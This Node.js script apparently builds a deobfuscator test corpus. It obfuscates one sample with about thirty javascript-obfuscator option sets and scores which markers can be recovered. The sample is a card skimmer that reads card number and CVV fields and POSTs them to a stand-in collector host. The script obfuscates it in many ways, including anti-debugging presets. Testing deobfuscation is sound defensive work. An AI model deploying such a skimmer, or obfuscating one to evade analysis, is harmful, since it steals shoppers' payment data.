const fs = require('fs');
const path = require('path');
const JavaScriptObfuscator = require('javascript-obfuscator');

// One source, with markers chosen so recovery is unambiguous: a host, a path, a DOM selector,
// a distinctive identifier, and an arithmetic result.
const SOURCE = `
function collectPayment(form) {
  var endpoint = "https://collector-example-42.com/checkout";
  var card = document.querySelector('#card-number').value;
  var cvv = document.querySelector('#cvv').value;
  var total = 1200 + 345;
  if (card && cvv) {
    fetch(endpoint, { method: 'POST', body: JSON.stringify({ card: card, cvv: cvv, total: total }) });
  }
  return total;
}
`;

const MARKERS = [
  'collector-example-42.com',
  '#card-number',
  '#cvv',
  'collectPayment',
  'querySelector',
];

// Recovery is only a meaningful test for markers carried as string DATA: those go into the string
// array and can be brought back. A marker that exists only as an identifier - a function name, a
// property - is a different matter. renameGlobals renames `collectPayment` to a hex name and records
// the original nowhere, so no deobfuscator can recover it; counting that as a miss measures the
// obfuscator's irreversibility, not the deobfuscator. So the recovery target is exactly the markers
// that appear inside a string literal in the source.
const STRING_MARKERS = MARKERS.filter((m) => {
  const re = new RegExp("['\"`][^'\"`]*" + m.replace(/[.*+?^${}()|[\]\\]/g, '\\$&') + "[^'\"`]*['\"`]");
  return re.test(SOURCE);
});

const CASES = {
  'baseline-stringarray': {
    compact: true, stringArray: true, stringArrayThreshold: 1,
    identifierNamesGenerator: 'hexadecimal',
  },
  'rotate': {
    compact: true, stringArray: true, stringArrayThreshold: 1,
    stringArrayRotate: true, identifierNamesGenerator: 'hexadecimal',
  },
  'shuffle-rotate': {
    compact: true, stringArray: true, stringArrayThreshold: 1,
    stringArrayRotate: true, stringArrayShuffle: true,
    identifierNamesGenerator: 'hexadecimal',
  },
  'encoding-base64': {
    compact: true, stringArray: true, stringArrayThreshold: 1,
    stringArrayEncoding: ['base64'], identifierNamesGenerator: 'hexadecimal',
  },
  'encoding-rc4': {
    compact: true, stringArray: true, stringArrayThreshold: 1,
    stringArrayEncoding: ['rc4'], identifierNamesGenerator: 'hexadecimal',
  },
  'wrappers': {
    compact: true, stringArray: true, stringArrayThreshold: 1,
    stringArrayWrappersCount: 2, stringArrayWrappersType: 'function',
    stringArrayWrappersChainedCalls: true, identifierNamesGenerator: 'hexadecimal',
  },
  'split-strings': {
    compact: true, stringArray: true, stringArrayThreshold: 1,
    splitStrings: true, splitStringsChunkLength: 4,
    identifierNamesGenerator: 'hexadecimal',
  },
  'numbers-to-expressions': {
    compact: true, stringArray: true, stringArrayThreshold: 1,
    numbersToExpressions: true, identifierNamesGenerator: 'hexadecimal',
  },
  'unicode-escape': {
    compact: true, stringArray: false, unicodeEscapeSequence: true,
  },
  'transform-object-keys': {
    compact: true, stringArray: true, stringArrayThreshold: 1,
    transformObjectKeys: true, identifierNamesGenerator: 'hexadecimal',
  },
  'dead-code': {
    compact: true, stringArray: true, stringArrayThreshold: 1,
    deadCodeInjection: true, deadCodeInjectionThreshold: 1,
    identifierNamesGenerator: 'hexadecimal',
  },
  'control-flow-flattening': {
    compact: true, stringArray: true, stringArrayThreshold: 1,
    controlFlowFlattening: true, controlFlowFlatteningThreshold: 1,
    identifierNamesGenerator: 'hexadecimal',
  },
  'self-defending': {
    compact: true, stringArray: true, stringArrayThreshold: 1,
    selfDefending: true, identifierNamesGenerator: 'hexadecimal',
  },
  // ---- second wave: option axes the first wave did not cover ----
  'mangled-names': {
    compact: true, stringArray: true, stringArrayThreshold: 1,
    stringArrayRotate: true, identifierNamesGenerator: 'mangled',
  },
  'mangled-shuffled-names': {
    compact: true, stringArray: true, stringArrayThreshold: 1,
    stringArrayRotate: true, identifierNamesGenerator: 'mangled-shuffled',
  },
  'dictionary-names': {
    compact: true, stringArray: true, stringArrayThreshold: 1,
    stringArrayRotate: true, identifierNamesGenerator: 'dictionary',
    identifiersDictionary: ['alpha', 'beta', 'gamma', 'delta', 'epsilon', 'zeta', 'eta', 'theta'],
  },
  'hex-numeric-string-indexes': {
    compact: true, stringArray: true, stringArrayThreshold: 1,
    stringArrayRotate: true, stringArrayIndexesType: ['hexadecimal-numeric-string'],
    identifierNamesGenerator: 'hexadecimal',
  },
  'calls-transform': {
    compact: true, stringArray: true, stringArrayThreshold: 1,
    stringArrayRotate: true, stringArrayCallsTransform: true,
    stringArrayCallsTransformThreshold: 1, identifierNamesGenerator: 'hexadecimal',
  },
  'variable-wrappers': {
    compact: true, stringArray: true, stringArrayThreshold: 1,
    stringArrayRotate: true, stringArrayWrappersCount: 2,
    stringArrayWrappersType: 'variable', identifierNamesGenerator: 'hexadecimal',
  },
  'deep-function-wrappers': {
    compact: true, stringArray: true, stringArrayThreshold: 1,
    stringArrayRotate: true, stringArrayWrappersCount: 5,
    stringArrayWrappersType: 'function', stringArrayWrappersChainedCalls: true,
    stringArrayWrappersParametersMaxCount: 5, identifierNamesGenerator: 'hexadecimal',
  },
  'no-index-shift': {
    compact: true, stringArray: true, stringArrayThreshold: 1,
    stringArrayRotate: true, stringArrayIndexShift: false,
    identifierNamesGenerator: 'hexadecimal',
  },
  'mixed-encoding': {
    compact: true, stringArray: true, stringArrayThreshold: 1,
    stringArrayRotate: true, stringArrayEncoding: ['base64', 'rc4'],
    identifierNamesGenerator: 'hexadecimal',
  },
  'rc4-rotate-shuffle': {
    compact: true, stringArray: true, stringArrayThreshold: 1,
    stringArrayRotate: true, stringArrayShuffle: true,
    stringArrayEncoding: ['rc4'], identifierNamesGenerator: 'hexadecimal',
  },
  'unicode-plus-array': {
    compact: true, stringArray: true, stringArrayThreshold: 1,
    stringArrayRotate: true, unicodeEscapeSequence: true,
    identifierNamesGenerator: 'hexadecimal',
  },
  'not-compact': {
    compact: false, stringArray: true, stringArrayThreshold: 1,
    stringArrayRotate: true, identifierNamesGenerator: 'hexadecimal',
  },
  'rename-globals': {
    compact: true, stringArray: true, stringArrayThreshold: 1,
    stringArrayRotate: true, renameGlobals: true, identifierNamesGenerator: 'hexadecimal',
  },
  'debug-protection': {
    compact: true, stringArray: true, stringArrayThreshold: 1,
    stringArrayRotate: true, debugProtection: true, disableConsoleOutput: true,
    identifierNamesGenerator: 'hexadecimal',
  },
  'domain-lock': {
    compact: true, stringArray: true, stringArrayThreshold: 1,
    stringArrayRotate: true, domainLock: ['example.com'],
    identifierNamesGenerator: 'hexadecimal',
  },
  // obfuscator.io's own "High obfuscation, low performance" preset
  'preset-high': {
    compact: true, controlFlowFlattening: true, controlFlowFlatteningThreshold: 1,
    deadCodeInjection: true, deadCodeInjectionThreshold: 1, debugProtection: true,
    debugProtectionInterval: 4000, disableConsoleOutput: true,
    identifierNamesGenerator: 'hexadecimal', log: false, numbersToExpressions: true,
    renameGlobals: false, selfDefending: true, simplify: true, splitStrings: true,
    splitStringsChunkLength: 5, stringArray: true, stringArrayCallsTransform: true,
    stringArrayEncoding: ['rc4'], stringArrayIndexShift: true, stringArrayRotate: true,
    stringArrayShuffle: true, stringArrayWrappersCount: 5, stringArrayWrappersChainedCalls: true,
    stringArrayWrappersParametersMaxCount: 5, stringArrayWrappersType: 'function',
    stringArrayThreshold: 1, transformObjectKeys: true, unicodeEscapeSequence: false,
  },
  // the same preset with mangled names, which is what most real deployments look like
  'preset-high-mangled': {
    compact: true, controlFlowFlattening: true, controlFlowFlatteningThreshold: 1,
    deadCodeInjection: true, deadCodeInjectionThreshold: 1,
    identifierNamesGenerator: 'mangled', numbersToExpressions: true, simplify: true,
    splitStrings: true, splitStringsChunkLength: 5, stringArray: true,
    stringArrayCallsTransform: true, stringArrayEncoding: ['base64'], stringArrayRotate: true,
    stringArrayShuffle: true, stringArrayWrappersCount: 3, stringArrayWrappersChainedCalls: true,
    stringArrayWrappersType: 'function', stringArrayThreshold: 1, transformObjectKeys: true,
  },
  'kitchen-sink': {
    compact: true, stringArray: true, stringArrayThreshold: 1,
    stringArrayRotate: true, stringArrayShuffle: true,
    stringArrayEncoding: ['base64'], stringArrayWrappersCount: 2,
    splitStrings: true, splitStringsChunkLength: 5,
    numbersToExpressions: true, transformObjectKeys: true,
    identifierNamesGenerator: 'hexadecimal',
  },
};

const outDir = path.join(__dirname, 'samples');
fs.rmSync(outDir, { recursive: true, force: true });
fs.mkdirSync(outDir, { recursive: true });

const manifest = [];
for (const [name, options] of Object.entries(CASES)) {
  try {
    const code = JavaScriptObfuscator.obfuscate(SOURCE, options).getObfuscatedCode();
    const file = path.join(outDir, name + '.js');
    fs.writeFileSync(file, code, 'utf8');
    // Which markers survive verbatim in the obfuscated text? Those are not really hidden,
    // so recovering them proves nothing.
    const visible = MARKERS.filter((m) => code.includes(m));
    // The ones worth scoring: string-data markers that the obfuscator actually hid. An identifier
    // marker lost to renameGlobals is deliberately excluded - it is unrecoverable by construction.
    const hiddenRecoverable = STRING_MARKERS.filter((m) => !code.includes(m));
    manifest.push({ name, file, bytes: code.length, visibleMarkers: visible, hiddenRecoverable });
  } catch (e) {
    manifest.push({ name, error: String(e).slice(0, 120) });
  }
}

fs.writeFileSync(path.join(outDir, 'manifest.json'),
  JSON.stringify({ markers: MARKERS, stringMarkers: STRING_MARKERS, cases: manifest }, null, 1), 'utf8');

for (const c of manifest) {
  if (c.error) { console.log(`  ${c.name.padEnd(26)} ERROR ${c.error}`); continue; }
  console.log(`  ${c.name.padEnd(26)} ${String(c.bytes).padStart(6)}b  already-visible: ${c.visibleMarkers.length}/${MARKERS.length}`);
}
